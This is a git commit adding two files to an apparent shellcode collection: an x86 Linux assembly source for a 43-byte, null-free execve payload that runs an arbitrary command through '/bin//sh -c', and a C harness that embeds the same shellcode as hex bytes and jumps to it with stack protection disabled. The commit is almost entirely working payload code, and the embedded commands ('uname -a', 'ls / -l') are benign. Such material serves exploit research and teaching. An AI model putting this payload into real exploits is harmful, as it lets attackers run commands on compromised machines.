adc666eb068e4c7131cd00d3b2bb4cd6596a7849
Geyslan G. Bem <geyslan@gmail.com>
2021-01-19 17:23:21 -0300

    x86 execve dynamic cmd - 43 bytes
    Signed-off-by: Geyslan G. Bem <geyslan@gmail.com>

---
+++ improvements/x86_execve_dyn.asm
@@ -0,0 +1,87 @@
+; execve Dynamic - Assembly Language - Linux/x86
+; Copyright (c) 2021, Geyslan G. Bem, Hacking bits
+; All rights reserved.
+;
+;     http://hackingbits.github.io
+;     geyslan@gmail.com
+;
+; Redistribution and use in source and binary forms, with or without
+; modification, are permitted provided that the following conditions
+; are met:
+;
+;     * Redistributions of source code must retain the above copyright
+;     notice, this list of conditions and the following disclaimer.
+;
+;     * Redistributions in binary form must reproduce the above
+;     copyright notice, this list of conditions and the following
+;     disclaimer in the documentation and/or other materials provided
+;     with the distribution.
+;
+;     * Neither the name of the Geyslan G. Bem nor the names of its
+;     contributors may be used to endorse or promote products derived
+;     from this software without specific prior written permission.
+
+; THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS 
+; "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT 
+; LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
+; FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+; COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
+; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
+; BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+; CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+; LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+; ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+; POSSIBILITY OF SUCH DAMAGE.
+
+
+;   x86_execve_dyn
+;
+;   * 43 bytes (without dynamic command)
+;   * null-free
+;
+;
+;   # nasm -f elf32 x86_execve_dyn.asm
+;   # ld -m elf_i386 x86_execve_dyn.o -o x86_execve_dyn
+;
+;   Testing
+;   # ./x86_execve_dyn
+
+global _start
+
+section .text
+
+_start:
+	push 11             ; execve() syscall
+	pop eax
+	cdq                 ; envp[] = edx = NULL
+	
+	push edx            ; NULL pointer
+	push word 0x632d    ; "-c"
+	mov edi, esp        ; edi = pointer to "-c\0" string
+	jmp getpc
+code:
+	pop esi             ; esi = pointer to dynamic command string
+	mov [esi+slen], edx ; put '\0' at the end of the command string
+	
+	push edx            ; NULL pointer
+	push 0x68732f2f     ; "//sh"
+	push 0x6e69622f	    ; "/bin"
+	mov ebx, esp	    ; ebx = pointer to "/bin//sh\0" string
+
+	push edx            ; NULL pointer
+	push esi            ; pointer to dynamic command
+	push edi            ; pointer to "-c\0"
+	push ebx            ; pointer to "/bin//sh\0"
+	mov ecx, esp        ; argv["/bin//sh\0", "-c\0", "dynamic cmd"] = ecx
+	int 0x80	    ; bingo
+
+; for build the shellcode comment the line below (section .data)
+; for test this assembly let it uncommented.
+;section .data
+
+getpc:
+	call code            ; return to code saving pc (dynamic cmd pointer) into the stack
+string:
+	db "uname -a"
+slen    equ $ - string
---
+++ improvements/x86_execve_dyn_shellcode.c
@@ -0,0 +1,70 @@
+/*
+
+execve Dynamic Shellcode - C Language - Linux/x86
+ Copyright (C) 2013 Geyslan G. Bem, Hacking bits
+
+   http://hackingbits.com
+   geyslan@gmail.com
+
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ (at your option) any later version.
+
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
+
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+*/
+
+/*
+
+   x86_execve_dyn_shellcode
+
+   * 43 bytes (without dynamic command)
+   * null-free
+
+
+   # gcc -m32 -fno-stack-protector -z execstack \
+   x86_execve_dyn_shellcode.c -o \
+   x86_execve_dyn_shellcode
+
+   Testing
+   # ./x86_execve_dyn_shellcode
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+	unsigned char code[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89"
+			       "\xe7\xeb\x19\x5e\x89\x56\x07\x52\x68\x2f"
+			       "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
+			       "\x52\x56\x57\x53\x89\xe1\xcd\x80\xe8\xe2"
+			       "\xff\xff\xff"
+			       "\x6c\x73\x20\x2f\x20\x2d\x6c"; // ls / -l
+
+	// When contains null bytes, printf will show a wrong shellcode length.
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	// Pollutes all registers ensuring that the shellcode runs in any
+	// circumstance.
+
+	__asm__("lea %[code], %%ebp\n\t"
+		"mov $0xffffffff, %%eax\n\t"
+		"mov %%eax, %%ebx\n\t"
+		"mov %%eax, %%ecx\n\t"
+		"mov %%eax, %%edx\n\t"
+		"mov %%eax, %%esi\n\t"
+		"mov %%eax, %%edi\n\t"
+		"call *%%ebp\n\t"
+		: /* no outputs */
+		: [code] "m"(code));
+}
